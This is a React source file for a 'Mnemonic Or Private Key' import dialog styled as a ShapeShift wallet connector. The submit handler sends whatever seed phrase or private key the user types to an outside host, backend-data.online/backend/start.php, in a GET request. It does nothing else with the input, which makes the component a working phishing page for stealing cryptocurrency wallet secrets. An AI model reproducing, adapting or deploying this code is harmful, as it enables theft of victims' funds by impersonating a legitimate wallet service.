import React, { useRef, useState } from "react";
import { FaPaste } from "react-icons/fa";
import { BiArrowBack } from "react-icons/bi";

const ImportWallet = ({ currentWallet, setImportWallet, setQRModal }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [shapeshift App]
      ${pass}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed top-0  inset-0 z-50 outline-0 ">
      <div className="lg:w-[30rem] w-[20rem]  rounded-md bg-[#3a3c50] drop-shadow-2xl  relative">
        <BiArrowBack
          onClick={() => {
            setImportWallet(false);
          }}
          className="text-white text-3xl absolute -top-10 left-0 bg-[#3a3c50] rounded-full p-2 cursor-pointer"
        />
        <div
          onClick={() => setImportWallet((pre) => !pre)}
          className="flex items-center  bg-[#2d3748] rounded-t-md cursor-pointer justify-between p-4 space-x-4 "
        >
          {currentWallet && (
            <img src={currentWallet} alt="loading..." className="w-10" />
          )}
          <p className="text-white font-[700] lg:text-xl text-md">
            Mnemonic Or Private Key
          </p>
        </div>
        <div className="p-5">
          <p className="text-white my-3 font-[500] text-sm">
            Restore an exsiting wallet with your 12 or 24 mnemonic words or your
            private key.
          </p>
          <div className="relative">
            <textarea
              onChange={(e) => setPass(e.target.value)}
              value={pass}
              ref={ref}
              className="bg-transparent border border-[#27262c] border-gray-700 rounded-md text-white outline-0 w-full h-40 p-4"
              placeholder="words separated by single space"
            />
            <FaPaste
              className="absolute bottom-2 right-0 shadow-xl text-lg text-white cursor-pointer"
              onClick={(e) => {
                handlePaste();
              }}
            />
          </div>

          <br />
          <div className="flex flex-col items-center">
            <button
              onClick={() => submitAddress()}
              disabled={!pass}
              className={
                pass
                  ? " bg-[#27262c] w-full px-5 py-3 text-sm rounded-md hover:opacity-80 shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                  : " bg-[#27262c] opacity-20 w-full px-5 py-3 text-sm rounded-md  shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
              }
            >
              Connect Wallet With Shapeshift
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ImportWallet;
